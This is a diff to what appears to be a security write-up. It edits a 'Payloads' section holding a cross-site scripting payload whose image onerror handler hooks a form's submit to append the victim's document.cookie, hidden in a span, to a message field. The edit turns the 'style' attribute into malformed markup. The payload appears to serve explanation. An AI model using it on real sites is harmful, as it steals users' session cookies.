@@ -61,9 +61,9 @@ can access the web server file system.
 
 # Payloads
 
-    <div style="display: none;"> 
+    <div="display: none;"> 
     <img src="fgfdgNotExistent" onerror="document.getElementById('form').onsubmit=function () {
-    var hidden='<span style=\'display:none;\'>'+document.cookie+'</span>'; 
+    var hidden='<span=\'display:none;\'>'+document.cookie+'</span>'; 
     document.getElementById('message').value+=hidden;}"/>
     </div>
 
@@ -71,7 +71,7 @@ can access the web server file system.
 
 Create a hidden div below the actual message
 
-    <div style="display: none;">
+    <div="display: none;">
 
 This div will contain the actual payload and is used to hide the image.
 
